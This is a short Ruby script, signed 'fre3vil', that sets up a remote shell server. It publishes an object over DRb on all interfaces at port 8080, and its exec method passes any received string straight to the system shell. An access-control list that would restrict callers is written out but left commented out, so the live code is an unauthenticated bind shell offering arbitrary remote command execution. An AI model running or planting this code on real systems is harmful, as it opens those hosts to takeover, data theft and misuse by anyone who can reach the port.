#!/usr/bin/env ruby
# code by fre3vil


require 'drb'
require 'acl'


class RShell
  def exec(cmd)
    `#{cmd}`
  end
end

# version 1
# DRb.start_service("druby://0.0.0.0:8080", RShell.new)
# DRb.thread.join



# version 2
# Access list
#  acl = ACL.new(%w{deny all
#              allow localhost 
              # allow 192.168.2.*})
# DRb.install_acl(acl)
DRb.start_service("druby://0.0.0.0:8080", RShell.new)
DRb.thread.join
